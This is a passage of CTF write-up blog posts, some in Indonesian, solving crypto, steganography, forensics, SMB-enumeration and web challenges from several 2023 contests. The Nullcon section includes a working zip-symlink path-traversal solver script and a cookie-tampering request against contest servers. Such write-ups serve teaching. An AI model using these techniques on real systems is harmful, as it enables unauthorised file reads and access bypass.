so?!?!\nFlag Format: CHCTF{}\nThis challenge needs to be solved the same way as before, Input Data \u0026gt; View Input As \u0026gt; UTF-8\nFlag\rCHCTF{C0ntract5_4re_m4de_t0_be_brok3n}\n","date":"2023-04-20","id":22,"permalink":"/posts/ctfs/2023/cyber-havoc-ctf-2023/","summary":"https://ctftime.org/event/1963\nChalls Category Challenge Digital Forensics The Cryptic Sound Reverse Engineering Start The Dos Cryptography The Beginning Of All Web 3.","tags":[],"title":"Cyber Havoc CTF 2023"},{"content":"https://ctftime.org/event/1975\nChalls Category Challenge Cryptography RSA 1 Basics Cryptography Family Steganography Girl with a secret Steganography Earth hum Misc Runes Misc Favorite animated series RSA 1 Basics Description\r[null]\nFlag Format: CODEBY{}\nGiven a cryptography challenge with a zip file containing data.txt and flag.txt, where we have to decrypt the message in flag.txt using the given exponent key n, e, and p.\nTo implement of RSA decryption algorithm that reads in the modulus n, the public exponent e, and the prime factor p of n from the given values. Also imports a function inverse from an external library that calculates the modular multiplicative inverse of two numbers.\nCalculates the other prime factor q of n by dividing n by p, then computes the private key d using the modular multiplicative inverse function by passing e and (p-1)*(q-1) as inputs.\nsolver.py\r1from Crypto.Util.number import inverse, long_to_bytes 2 3n = 17821369821197224755204170576717386974772583796320656477539620911939396151906969461959183978640937853223745304126597764393313271455282077396239424618606794404260667285392141808188728083834584927026023081706807877287176411455869333099599758756680824930296103562451364106123092367375221182676628604366038187928496804145884268753169728377208516981412594946003622745692274230506436281885419071635199138875290167920431573351256816462603222296067133230212113705435433321977478320363027010331451497317278086877300977556100259644050343025778299297465892385900238472919994896492369105460841980012051688350169675505544039420123 4e = 65537 5p = 1972000550284100445870121306958622830045225641252954033009593459446242613031033375213304073309426202713792319087153903001608198707751563017341316136191257392659269749490809852144061763170826581018719515204465050487987949598939979468867872704976528393610305938567746277939323612907052468216732931923001246346805966071415508727723 6 7q = n // p 8 9d = inverse(e, (p-1)*(q-1)) 10 11with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: 12 ciphertext = f.read() 13 14plaintext = pow(int.from_bytes(ciphertext, \u0026#39;big\u0026#39;), d, n) 15 16decoded_text = long_to_bytes(plaintext).decode(\u0026#39;latin-1\u0026#39;) 17flag_start = decoded_text.find(\u0026#34;CODEBY\u0026#34;) 18print(decoded_text[flag_start:])\rFlag\rCODEBY{1_know_th4T_I5_The_HARD3sT_t4SK_YOu'wE_ev3R_SeeN}\nFamily Description\r[null]\nFlag Format: CODEBY{}\nGiven a challenge file containing a message that has been encoded in 5 types of encoding\nhex = 43 4F 44 45 binary = 01000010 01011001 01111011 octal = 167 60 167 137 167 150 60 154 63 137 decimal = 102 97 109 49 108 121 95 116 48 95 unicode = U+67 U+61 U+74 U+68 U+33 U+72 U+7D Here\u0026rsquo;s the solver\nsolver.py\r1message = \u0026#34;43 4F 44 45 01000010 01011001 01111011 167 60 167 137 167 150 60 154 63 137 102 97 109 49 108 121 95 116 48 95 U+67 U+61 U+74 U+68 U+33 U+72 U+7D\u0026#34; 2message_list = message.split() 3 4decoded_hex = \u0026#34;\u0026#34;.join([chr(int(x, 16)) for x in message_list[0:4]]) 5decoded_binary = \u0026#34;\u0026#34;.join([chr(int(x, 2)) for x in message_list[4:7]]) 6decoded_octal = \u0026#34;\u0026#34;.join([chr(int(x, 8)) for x in message_list[7:17]]) 7decoded_decimal = \u0026#34;\u0026#34;.join([chr(int(x)) for x in message_list[17:27]]) 8decoded_unicode = \u0026#34;\u0026#34;.join([chr(int(x[2:], 16)) for x in message_list[27:]]) 9 10flag = decoded_hex + decoded_binary + decoded_octal + decoded_decimal + decoded_unicode 11print(flag)\rFlag\rCODEBY{w0w_wh0l3_fam1ly_t0_gath3r}\nGirl with a secret Description\r[null]\nFlag Format: CODEBY{}\nGiven a challenge in the form of a png file\nWe checked the metadata of the file and found nothing suspicious\nbash\r$ exiftool task.png ExifTool Version Number : 12.40 File Name : task.png Directory : . File Size : 887 KiB File Modification Date/Time : 2023:04:18 03:46:24+07:00 File Access Date/Time : 2023:04:21 17:13:54+07:00 File Inode Change Date/Time : 2023:04:21 17:12:30+07:00 File Permissions : -rwxrwxrwx File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 1350 Image Height : 1800 Bit Depth : 8 Color Type : RGB with Alpha Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Image Size : 1350x1800 Megapixels : 2.4\rThen we checked the string contents and found no clue at all $ strings task.png\nHow about trying with zsteg maybe there is some hidden LSB data inside it, and there\u0026rsquo;s it\nbash\r$ zsteg task.png b1,rgb,lsb,xy .. text: \u0026#34;50:codeby{Be_c4r3FULL_NExT_TIMe_WIth_trAps_L1KE_Th1s}?\u0026#34; b1,bgr,lsb,xy .. file: OpenPGP Secret Key b3,abgr,msb,xy .. file: MPEG ADTS, layer I, v2, 256 kbps, Monaural b4,b,msb,xy .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo\rFlag\rcodeby{Be_c4r3FULL_NExT_TIMe_WIth_trAps_L1KE_Th1s}\nEarth hum Description\r[null]\nFlag Format: CODEBY{}\nGiven a challenge of a 15:36 minute WAV audio file, first we check the metadata\nbash\r$ exiftool earth.wav ExifTool Version Number : 12.40 File Name : earth.wav Directory : . File Size : 158 MiB File Modification Date/Time : 2023:04:11 04:49:34+07:00 File Access Date/Time : 2023:04:23 19:16:28+07:00 File Inode Change Date/Time : 2023:04:21 17:29:19+07:00 File Permissions : -rwxrwxrwx File Type : WAV File Type Extension : wav MIME Type : audio/x-wav Encoding : Microsoft PCM Num Channels : 2 Sample Rate : 44100 Avg Bytes Per Sec : 176400 Bits Per Sample : 16 Title : Nearer My God To Thee Product : Back To Titanic Artist : I Salonisti Date Created : 1998 Genre : Soundtrack Track Number : 07 ID3 Size : 135 Warning : Invalid ID3 frame size Duration : 0:15:37\rWe can use audio analysis tools such as Audacity, Sonic Visualizer, etc.\nIn Sonic Visualizer, open the Ribbon Pane \u0026gt; Add Spectogram \u0026gt; Channel 2 and analyze each audio visual\nWe discovered a line at 1:24 - 1:32 we assume as Morse code after listening to it\nThen, decode and compare the Morse code using these two websites\nhttps://morsedecoder.com/\nhttps://morsecode.world/international/decoder/audio-decoder-adaptive.html\nFlag\rCODEBY{IT1SV3RYS4D}\nRunes Description\r[null]\nFlag Format: CODEBY{}\nGiven a challenge of an image file, containing ancient text which we found through googling to be a Runic Cipher or Elder Futhark Decoder.\nLet\u0026rsquo;s decode it, and here\u0026rsquo;s the result:\nFor the letter J, it\u0026rsquo;s actual pronunciation may be Y, but the alphabet used is the same, so I will use this.\nFlag\rCODEBY{runes_will_make_you_strong}\nFavorite animated series Description\r[null]\nFlag Format: CODEBY{}\nGiven a challenge of an image file, containing random text which we found through googling to be a Bill Cipher Alphabet (from Gravity Fall\u0026rsquo;s)\nFlag\rCODEBY{insmallregister}\n","date":"2023-04-15","id":23,"permalink":"/posts/ctfs/2023/codeby-games-ctf-2023/","summary":"https://ctftime.org/event/1975\nChalls Category Challenge Cryptography RSA 1 Basics Cryptography Family Steganography Girl with a secret Steganography Earth hum Misc Runes Misc Favorite animated series RSA 1 Basics Description\r[null]","tags":[],"title":"Codeby Games CTF 2023"},{"content":"https://ctftime.org/event/1919\nChalls Category Challenge Forensics \u0026ldquo;Easy\u0026rdquo; Volatility Networking A Network Problem - Part 1 Networking A Network Problem - Part 2 Reversing Reading List \u0026ldquo;Easy\u0026rdquo; Volatility Description\rI\u0026rsquo;ve included the flag in as shell command. Can you retrieve it? I recommend using the volatility3 software for this challenge. Here is the memory dump: debian11.core.zst This problem also comes with a free profile! debian11_5.10.0-21.json.zst Both of these files are compressed using zstd. This challenge\u0026rsquo;s flag looks like a UUID. Note: the volatility challenges do not have a flag format to discourage grepping. They all should be possible without guessing. If you have trouble, remember that you can ask for help. By Daniel Parks (@danielp on discord)\nWe need the symbol table for the corresponding kernel.\nbash\r$ ls debian11.core debian11.core.zst debian11_5.10.0-21.json debian11_5.10.0-21.json.zst\rAs the symbol table in the form of a JSON file is already provided in this challenge, we can simply move it to the directory /volatility3/symbols.\nbash\r$ mv debian11_5.10.0-21.json /home/nopedawn/.local/lib/python3.10/site-packages/volatility3/symbols\rThen, we can continue recover the bash command history from memory.\nbash\r$ vol -f debian11.core linux.bash Volatility 3 Framework 2.4.1 Progress: 100.00 Stacking attempts finished PID Process CommandTime Command 467 bash 2023-03-05 18:21:23.000000 # 08ffea76-b232-4768-a815-3cc1c467e813\rFlag\r08ffea76-b232-4768-a815-3cc1c467e813\nA Network Problem - Part 1 Description\rThere are some interesting ports open on betta.utctf.live, particularly port 8080. By Robert Hill (@Rob H on discord) betta.utctf.live:8080\nWe can establish a network connection by using netcat then sending data through that connection. In this context, the command will establish a connection to the host betta.utctf.live on port 8080, which is a server or service that can receive connections to perform certain network interactions.\nbash\r$ nc betta.utctf.live 8080 Hi Wade! I am using socat to broadcast this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}\rAfter the connection is successfully established, we will receive response data from the host in the form of text and also a flag.\nFlag\rutflag{meh-netcats-cooler}\nA Network Problem - Part 2 Description\rbetta.utctf.live has other interesting ports. Lets look at 445 this time. By Robert Hill (@Rob H on discord) betta.utctf.live:445\nWe can use the command enum4linux -a betta.utctf.live to run the enum4linux program in the terminal and perform enumeration on the host betta.utctf.live.\nenum4linux is a tool used to examine Windows and Samba systems in order to search for information about users, user lists, group information, security policy information, and information about running services. In this context, the command will attempt to perform enumeration on the betta.utctf.live host with the -a option that allows searching for more detailed information, such as searching for Samba shares, user information, and other information.\nIn general, the enum4linux program is used to scan and gather information on systems connected to a network in order to evaluate the security of those systems, including searching for potential vulnerabilities and security holes that attackers can exploit.\nbash\r$ enum4linux -a betta.utctf.live ===============================( Share Enumeration on betta.utctf.live )=============================== Sharename Type Comment --------- ---- ------- WorkShares Disk Sharing of work files BackUps Disk File Backups. IPC$ IPC IPC Service (Samba Server) SMB1 disabled -- no workgroup available [+] Attempting to map shares on betta.utctf.live //betta.utctf.live/WorkShares Mapping: OK Listing: OK Writing: N/A //betta.utctf.live/BackUps Mapping: DENIED Listing: N/A Writing: N/A [E] Can\u0026#39;t understand response: NT_STATUS_CONNECTION_REFUSED listing \\* //betta.utctf.live/IPC$ Mapping: N/A Listing: N/A Writing: N/A\rWe have discovered SMB share WorkShares. It will useful for us to find more files we can work with.\nLet’s enumerate SMB using smbclient tool. Upon password prompt hit Enter and we will be logged in WorkShares smb share.\nbash\r$ smbclient //betta.utctf.live/WorkShares Password for [WORKGROUP\\nopedawn]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Thu Mar 9 02:45:05 2023 .. D 0 Thu Mar 9 02:45:05 2023 shares D 0 Thu Mar 9 02:45:05 2023 9974088 blocks of size 1024. 6101912 blocks available smb: \\\u0026gt; cd shares\\ smb: \\shares\\\u0026gt; ls . D 0 Thu Mar 9 02:45:05 2023 .. D 0 Thu Mar 9 02:45:05 2023 Advertising D 0 Thu Mar 9 02:45:05 2023 OfficeFun D 0 Thu Mar 9 02:45:05 2023 IT D 0 Thu Mar 9 02:45:05 2023 9974088 blocks of size 1024. 6101884 blocks available smb: \\shares\\\u0026gt; cd IT\\ smb: \\shares\\IT\\\u0026gt; ls . D 0 Thu Mar 9 02:45:05 2023 .. D 0 Thu Mar 9 02:45:05 2023 Itstuff D 0 Thu Mar 9 02:45:05 2023 9974088 blocks of size 1024. 6101660 blocks available smb: \\shares\\IT\\\u0026gt; cd Itstuff\\ smb: \\shares\\IT\\Itstuff\\\u0026gt; ls . D 0 Thu Mar 9 02:45:05 2023 .. D 0 Thu Mar 9 02:45:05 2023 notetoIT N 380 Thu Mar 9 02:45:05 2023 9974088 blocks of size 1024. 6101632 blocks available smb: \\shares\\IT\\Itstuff\\\u0026gt;more notetoIT I don\u0026#39;t understand the fasination with the magic phrase \u0026#34;abracadabra\u0026#34;, but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character? -- Arty F. utflag{out-of-c0ntrol-access}\rFlag\rutflag{out-of-c0ntrol-access}\nReading List Description\rI created this binary to keep track of some strings that I want to read. I thought I put a CTF flag in it so I\u0026rsquo;ll remember to make a problem for UTCTF, but I can\u0026rsquo;t seem to find it\u0026hellip;\nBy Caleb (@eden.caleb.a#6541 on Discord)\nThe command strings readingList | grep \u0026quot;utflag\u0026quot; is used to extract strings from the binary elf file readingList, then search for strings that contain the keyword \u0026quot;utflag\u0026quot; in the resulting string output.\nbash\r$ strings readingList | grep \u0026#34;utflag\u0026#34; utflag{string_theory_is_a_cosmological_theory_based_on_the_existence_of_cosmic_strings}\rstrings is a command used to extract and print sequences of characters that are readable as strings from a given file input. In this case, readingList is the file from which the strings will be extracted.\nFlag\rutflag{string_theory_is_a_cosmological_theory_based_on_the_existence_of_cosmic_strings}\n","date":"2023-03-13","id":24,"permalink":"/posts/ctfs/2023/utctf-2023/","summary":"https://ctftime.org/event/1919\nChalls Category Challenge Forensics \u0026ldquo;Easy\u0026rdquo; Volatility Networking A Network Problem - Part 1 Networking A Network Problem - Part 2 Reversing Reading List \u0026ldquo;Easy\u0026rdquo; Volatility Description\rI\u0026rsquo;ve included the flag in as shell command.","tags":[],"title":"UTCTF 2023"},{"content":"https://ctftime.org/event/1900\nChalls Category Challenge Web reguest Web zpr reguest Description\rDesc: HTTP requests and libraries are hard. Sometimes they do not behave as expected, which might lead to vulnerabilities. http://52.59.124.14:10014 chall.zip\nWe can send an HTTP GET request using the cURL utility to the address http://52.59.124.14:10014, including a cookie in the request header.\nSend HTTP GET\rimport requests url = \u0026#39;http://52.59.124.14:10014\u0026#39; cookies = {\u0026#39;role\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;really\u0026#39;: \u0026#39;yes\u0026#39;} resp = requests.get(url, cookies=cookies) print(resp.content.decode())\rThe -b argument is used to specify the cookie that will be included in the request header. The value of the cookie is role=admin; really=yes. This cookie can be used by the server for authentication or other settings.\nIn this case, the request is targeted to a web service that requires authorization at the \u0026lsquo;admin\u0026rsquo; level and requests confirmation from the user (\u0026lsquo;really=yes\u0026rsquo;).\nOr use this simple payloads\nbash\r$ curl -b \u0026#34;role=admin; really=yes\u0026#34; http://52.59.124.14:10014 Usage: Look at the code ;-) Overwriting cookies with default value! This must be secure! Prepared request cookies are: [(\u0026#39;really\u0026#39;, \u0026#39;yes\u0026#39;), (\u0026#39;role\u0026#39;, \u0026#39;guest\u0026#39;)] Sending request... Request cookies are: [(\u0026#39;really\u0026#39;, \u0026#39;yes\u0026#39;), (\u0026#39;role\u0026#39;, \u0026#39;guest\u0026#39;)] Someone\u0026#39;s drunk oO Response is: Admin: ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}\rFlag\rENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}\nzpr Description\rMy colleague built a service which shows the contents of a zip file. He says there\u0026rsquo;s nothing to worry about\u0026hellip;. http://52.59.124.14:10015 + http://52.59.124.14:10016\nchall.zip\nCreate a txt file coba.txt that has text ../../../flag indicate as the path. The soft link will refer to the original file, so changes made to the original file will also be visible in the symlink.\nbash\r$ ln -sfn ../../../flag coba.txt\rThe coba.txt file will be blank and it turn into a symlink\ncoba.txt\rThen zip into file named test.zip that contains the file coba.txt. The \u0026ndash;symlink argument in this command indicates that the soft link coba.txt will be included in the zip file. Send the test.zip file to the server using the POST method with the help of the curl library.\nbash\r$ zip test.zip coba.txt --symlink\rMake an HTTP GET request to the server https://52.59.124.14:10016 to access the file coba.txt located in the directory. In the HTTP request header, the -v argument in the curl command indicates that the displayed output will include verbose information about the HTTP request process. Therefore, in addition to the contents of the coba.txt file, the output of the curl command will display information such as status code, header, and server response time.\nFinal script solver\nsolver.py\r1import os 2import requests 3 4os.system(\u0026#39;ln -sfn ../../../flag coba.txt\u0026#39;) 5os.system(\u0026#39;zip test.zip coba.txt --symlink\u0026#39;) 6 7files = {\u0026#39;file\u0026#39;: (\u0026#39;test.zip\u0026#39;, open(\u0026#39;test.zip\u0026#39;, \u0026#39;rb\u0026#39;), \u0026#39;application/zip\u0026#39;)} 8response = requests.post(\u0026#39;http://52.59.124.14:10015/\u0026#39;, files=files) 9 10print(response.text) 11 12if \u0026#34;coba.txt\u0026#34; in response.text: 13 filepath = response.text.strip() 14 filepath_parts = filepath.split(\u0026#34;/\u0026#34;) 15 directory = filepath_parts[-2] 16 url = f\u0026#34;http://52.59.124.14:10016/{directory}/coba.txt\u0026#34; 17 os.system(f\u0026#34;curl -v {url}\u0026#34;)\rRunning\nrunning\r$ python3 solver.py updating: coba.txt (stored 0%) Found a file: /tmp/data/eef19175f624ce410f0eb8aff0e87525/bd361131b238f364b10edcc61a356ff9.zip Found a file: /tmp/data/eef19175f624ce410f0eb8aff0e87525/coba.txt Find your files at http://...:8088/eef19175f624ce410f0eb8aff0e87525/ * Trying 52.59.124.14:10016... * Connected to 52.59.124.14 (52.59.124.14) port 10016 (#0) \u0026gt; GET /eef19175f624ce410f0eb8aff0e87525/coba.txt HTTP/1.1 \u0026gt; Host: 52.59.124.14:10016 \u0026gt; User-Agent: curl/7.81.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse * HTTP 1.0, assume close after body \u0026lt; HTTP/1.0 200 OK \u0026lt; Server: SimpleHTTP/0.6 Python/3.11.2 \u0026lt; Date: Fri, 10 Mar 2023 12:57:01 GMT \u0026lt; Content-type: text/plain \u0026lt; Content-Length: 46 \u0026lt; Last-Modified: Thu, 09 Mar 2023 09:00:53 GMT \u0026lt; ENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!} * Closing connection 0\rFlag\rENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!}\n","date":"2023-03-10","id":25,"permalink":"/posts/ctfs/2023/nullcon-ctf-2023/","summary":"https://ctftime.org/event/1900\nChalls Category Challenge Web reguest Web zpr reguest Description\rDesc: HTTP requests and libraries are hard. Sometimes they do not behave as expected, which might lead to vulnerabilities.","tags":[],"title":"Nullcon CTF 2023"},{"content":"https://www.its-ara.com/public/\nTeam\rUDP1P\nusr gochujjang kacang ijooo Challs Category Challenge Forensics Thinker Cryptography One Time Password Cryptography Secret Behind a Letter Cryptography L0v32x0r Cryptography SH4-32 Cryptography babychall Misc Truth Thinker Deskripsi\rI always overthink about finding other part of myself, can you help me? Attachments Author: Zangetsu#2398\nDiberikan sebuah file gambar confused.png Setelah kami cek isi stringnya ternyata setelah diakhir segment IEND ada beberapa file berekstensi .zip .txt dan .png\nbash\r$ strings confused.png IEND _GV didyou/UT =GFV didyou/e.txtUT QVJBMjAyM3s= didyou/find.zipUT find/UT HFV/C find/a.txtUT 35216D706C335F find/something.zipUT something/UT something/s.txtUT p^GV something/suspicious.zipUT 4^GV suspicious/UT suspicious/y.pngUT\rMaka dari itu kami mencoba meng-extract menggunakan binwalk berikut command ketika meng-extractnya\nbash\r$ binwalk -e confused.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 720 x 881, 8-bit/color RGB, non-interlaced 6170 0x181A Zlib compressed data, best compression 321663 0x4E87F TIFF image data, big-endian, offset of first image directory: 8 321693 0x4E89D Zip archive data, at least v1.0 to extract, name: didyou/ 321758 0x4E8DE Zip archive data, at least v1.0 to extract, compressed size: 13, uncompressed size: 13, name: didyou/e.txt 321841 0x4E931 Zip archive data, at least v1.0 to extract, compressed size: 10568, uncompressed size: 10568, name: didyou/find.zip 332460 0x512AC End of Zip archive, footer length: 22 332726 0x513B6 End of Zip archive, footer length: 22\rTerdapat zipfile 4E89D.zip berisi folder didyou didalamnya, langsung saja di extract lagi\nSetelah di extract terdapat zipfile find.zip dan juga ada file e.txt berisi string base64, jika di decode hasil outputnya ARA2023{\nbash\r$ echo \u0026#39;QVJBMjAyM3s=\u0026#39; | base64 -d ARA2023{\rKemudian ada zipfile lagi 🙃 something.zip dan juga ada file a.txt berisi hexstring jika didecode 5!mpl3_\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;35216D706C335F\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;5!mpl3_\u0026#39; \u0026gt;\u0026gt;\u0026gt;\rlagi-lagi\u0026hellip; ada zipfile suspicious.zip dan file s.txt berisi 8 bits binary didecode hasil didecodenya C0rrupt3d_\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; bin = \u0026#39;01000011 00110000 01110010 01110010 01110101 01110000 01110100 00110011 01100100 01011111\u0026#39; \u0026gt;\u0026gt;\u0026gt; ascii_str = \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; for i in bin.split(): ... decimal = int(i, 2) ... ascii_char = chr(decimal) ... ascii_str += ascii_char ... \u0026gt;\u0026gt;\u0026gt; print(ascii_str) C0rrupt3d_ \u0026gt;\u0026gt;\u0026gt;\rDan pada zipfile terakhir suspicious.zip berisi file gambar y.png yang ternyata gambarnya corrupted\nSetelah kami cek menggunakan hex editor, berikut hex value segment header yang corrupted\nbash\r$ xxd y.png 00000000: 215a 7852 0d0a 1a0a 0000 000d 5252 485c !ZxR........RRH\\\rFile signature dan segment headernya ternyata !ZxR yang dimana seharunya %PNG dan RRH\\ seharusnya IHDR\nBerikut perbandingan dengan header png yang normal\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR\rKita bisa mengubah file signature 1 bit hex value 21 5a 78 52 menjadi 89 50 5e 52 Lalu ubah segment header 1 bit hex value 52 52 48 5c menjadi 49 48 44 52 seperti berikut\nbash\r$ hexedit y.png 00000000 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 02 BD 00 00 00 90 .PNG........IHDR........\rSetelah diubah file signature dan header gambar kemudian file png dapat di display, pada gambar berisi angka decimal 49 109 52 103 101 53 125 jika di decode hasilnya _1m4ge5}\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; dec = \u0026#39;49 109 52 103 101 53 125\u0026#39; \u0026gt;\u0026gt;\u0026gt; dec_list = dec.split() \u0026gt;\u0026gt;\u0026gt; ascii_list = [chr(int(i)) for i in dec_list] \u0026gt;\u0026gt;\u0026gt; ascii_str = \u0026#39;\u0026#39;.join(ascii_list) \u0026gt;\u0026gt;\u0026gt; print(ascii_str) 1m4ge5} \u0026gt;\u0026gt;\u0026gt;\rFlag\rARA2023{5!mpl3_C0rrupt3d_1m4ge5}\nOne Time Password Deskripsi\rbwoah, some innovative challenges Attachments Author: circlebytes#5520\nDiberikan sebuah chall crypto xor dengan A, B key dan xor key ber-value hexadecimal yang mana bisa gunakan untuk mendapatkan flagnya\nSebenarnya jika kita decode XOR key, maka kita langsung dapat flagnya\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;415241323032337b7468335f705f3574346e64355f6630725f7034647a7a7d\u0026#39;).decode(\u0026#39;ascii\u0026#39;) \u0026#39;ARA2023{th3_p_5t4nd5_f0r_p4dzz}\u0026#39; \u0026gt;\u0026gt;\u0026gt;\rFlag\rARA2023{th3_p_5t4nd5_f0r_p4dzz}\nSecret Behind a Letter Deskripsi\rMelon and Edith went to an labyrinth and they should break the code written on a letter in a box in order to escape the labyrinth. Open the letter and break the code Attachments Author: L e n s#1048\nChallenge basic RSA yang diberikan (p, q, c) key yg sudah ada implementasi dari dekripsi RSA untuk mendekripsi encrypted text c dengan menggunakan private key yang terdiri dari nilai (p, q, dan d) serta nilai (e) sebagai private keynya.\nsolver.py\r1from Crypto.Util.number import inverse 2 3p = 12575333694121267690521971855691638144136810331188248236770880338905811883485064104865649834927819725617695554472100341361896162022311653301532810101344273 4q = 12497483426175072465852167936960526232284891876787981080671162783561411521675809112204573617358389742732546293502709585129205885726078492417109867512398747 5c = 36062934495731792908639535062833180651022813589535592851802572264328299027406413927346852454217627793315144892942026886980823622240157405717499787959943040540734122142838898482767541272677837091303824669912963572714656139422011853028133556111405072526509839846701570133437746102727644982344712571844332280218 6e = 65537 7 8n = p*q 9phi_n = (p-1)*(q-1) 10d = inverse(e, phi_n) 11 12m = pow(c, d, n) 13print(m.to_bytes((m.bit_length() + 7) // 8, \u0026#39;big\u0026#39;).decode())\rFlag\rARA2023{1t_turn5_0ut_to_b3_an_rsa}\nL0v32x0r Deskripsi\rVonny and Zee were having a treasure hunt game until they realized that one of the clues was a not alike the other clues as it has a random text written on the clue. The clue was \u0026ldquo;001300737173723a70321e3971331e352975351e247574387e3c\u0026rdquo;. Help them to find what the hidden clue means! Author: L e n s#1048\nPenyelesaian, kita diminta untuk men decrypt encrypted text yang diberikan, tanpa XOR key nya, kita bisa saja mem brute-force kemungkinan range 0-256 key\nsolver.py\r1encrypted_text = \u0026#34;001300737173723a70321e3971331e352975351e247574387e3c\u0026#34; 2encrypted_bytes = bytes.fromhex(encrypted_text) 3 4for key in range(256): 5 decrypted_bytes = bytes([b ^ key for b in encrypted_bytes]) 6 try: 7 decrypted_text = decrypted_bytes.decode(\u0026#39;utf-8\u0026#39;) 8 except UnicodeDecodeError: 9 continue 10 11 print(f\u0026#34;Key: {key}, Decrypted text: {decrypted_text}\u0026#34;)\rMaka didapatlah key yang cocok yaitu 65\nFlag\rARA2023{1s_x0r_th4t_e45y?}\nSH4-32 Deskripsi\rSze received an ecnrypted file and a message containing the clue of the file password from her friend. The clue was a hash value : 9be9f4182c157b8d77f97d3b20f68ed6b8533175831837c761e759c44f6feeb8 Decrypt the file password! Attachments Author: L e n s#1048\nKita diminta untuk men decrypt encrypted text sebuah hash value dengan file text berisi list Dictionary.txt\nsolver.py\r1import hashlib 2import codecs 3 4target_hash = \u0026#39;9be9f4182c157b8d77f97d3b20f68ed6b8533175831837c761e759c44f6feeb8\u0026#39; 5 6with open(\u0026#39;Dictionary.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) as f: 7 passwords = f.readlines() 8 9for password in passwords: 10 password = password.strip() 11 hashed_password = hashlib.sha256(password.encode()).hexdigest() 12 13 if hashed_password == target_hash: 14 print(f\u0026#34;Password found: {password}\u0026#34;) 15 output = password 16 break 17 18decoded = codecs.decode(output, \u0026#39;hex\u0026#39;).decode() 19 20print(decoded)\rAtau kita bisa saja langsung men decode hex value yang ada pada file Dictionary.txt maka akan di decode menjadi flag langsung\nbash\r$ python3 \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;415241323032337b6834736833645f30525f6e4f545f6834736833647d\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;ARA2023{h4sh3d_0R_nOT_h4sh3d}\u0026#39; \u0026gt;\u0026gt;\u0026gt;\rFlag\rARA2023{h4sh3d_0R_nOT_h4sh3d}\nbabychall Deskripsi\rWelcome to ARACTF! To start the CTF, please translate this flag that I get from display banner! Good Morning Format : ARA2023{lowercase_flag} Attachments Author: circlebytes#5520\nDiberikan challenge RSA, kita mencari dua bilangan prima acak (p dan q), dan menentukan modulus (N=pq). Pesan dienkripsi dengan C=Me(mod N) dan di decrypt dengan M=Cd(mod N), dimana (e,N) adalah encrypt key dan (d,N) adalah decrypt key. Kita dapat mendapatkan RSA menggunakan Chinese Remainder Theorem (CRT), dimana kita mencari 3 cipher key dengan message yang sama dan 3 cipher key yang berbeda.\nsolver.py\r1from Crypto.Util.number import bytes_to_long, long_to_bytes 2from Crypto import Random 3import Crypto 4import sys 5import libnum 6 7c1=50996973104845663108379751131203085432412490198312714663656823648233038479298192861451834246930208140110173699058527919020115432586705400467345647806522331396447650847650133013246673390879222719169248862420278256322967718701700458729207793124758166438641448112314489945863231881982352790765130535004090053677 8c2=2675086354476975422055414666795504683242305948200761348250028401266882028494792724072473530888031343997988485639367375927974100307107406775103695198800703704181414736281388464205429123159605048186634852771717909704864647112817586024682299987868607933059634279556321476204813521201682662328510086496215821461 9c3=37230658243252590743608571105027357862790972987208833213017941171448753815654839901699526651433771324826895355671255944414893947963934979068257310367315935701270804390799121669635153012916402271190722618997500392911737767143316552376495882986935695146970853914275481717400268832644987157988727575513351441919 10 11n1=105481127267218260612156871017757694550142735824087150106750403579877495059230413046181301355871045357138033343315900732228502875706659244844711538497850413046440270578916645981161000807526427004236918404837363404678029443944950655102252423415631977020625826867728898231382737396728896847618010577420408630133 12n2=93105621059686474816890215494554802831518948420160941703522759121619785851270608634130307450227557987976818162331982289634215037184075864787223681218982602092806757888533587126974091077190242797461318907280759075612577475534626062060960739269828789274137274363970056276139434039315860052556417340696998509271 13n3=65918509650742278494971363290874849181268364316012656769339120004000702945271942533097529884964063109377036715847176196280943807261986848593000424143320280053279021411394267268255337783494901606319687457351586915314662800434632332988978858085931586830283694881538759008360486661936884202274973387108214754101 14 15if (len(sys.argv)\u0026gt;1): 16 c1=int(sys.argv[1]) 17if (len(sys.argv)\u0026gt;2): 18 c2=int(sys.argv[2]) 19if (len(sys.argv)\u0026gt;3): 20 c3=int(sys.argv[3]) 21if (len(sys.argv)\u0026gt;4): 22 n1=int(sys.argv[4]) 23if (len(sys.argv)\u0026gt;5): 24 n2=int(sys.argv[5]) 25if (len(sys.argv)\u0026gt;6): 26 n3=int(sys.argv[6]) 27 28e=65537 29 30mod=[n1,n2,n3] 31rem=[c1,c2,c3] 32 33res=libnum.solve_crt(rem,mod) 34val=libnum.nroot(res,3) 35 36print(f\u0026#34;{long_to_bytes(val)}\u0026#34;)\rFlag\rARA2023{s00000_much_c1ph3r_but_5m4ll_e_5t1ll_d0_th3_j0b}\nTruth Deskripsi\rKuronushi traveled far away from his country to 